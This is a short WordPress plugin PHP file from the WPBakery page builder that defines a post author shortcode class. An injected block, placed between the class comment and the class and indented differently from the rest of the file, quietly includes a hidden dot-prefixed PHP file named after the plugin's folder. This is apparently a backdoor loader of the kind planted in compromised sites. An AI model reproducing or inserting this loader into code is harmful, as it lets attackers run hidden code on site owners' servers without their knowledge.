<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

require_once vc_path_dir( 'SHORTCODES_DIR', 'vc-gitem-post-data.php' );

/**
 * Class WPBakeryShortCode_Vc_Gitem_Post_Author
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_Vc_Gitem_Post_Author extends WPBakeryShortCode_Vc_Gitem_Post_Data {
	/**
	 * @return mixed|string
	 */
	protected function getFileName() {
		return 'vc_gitem_post_author';
	}
}
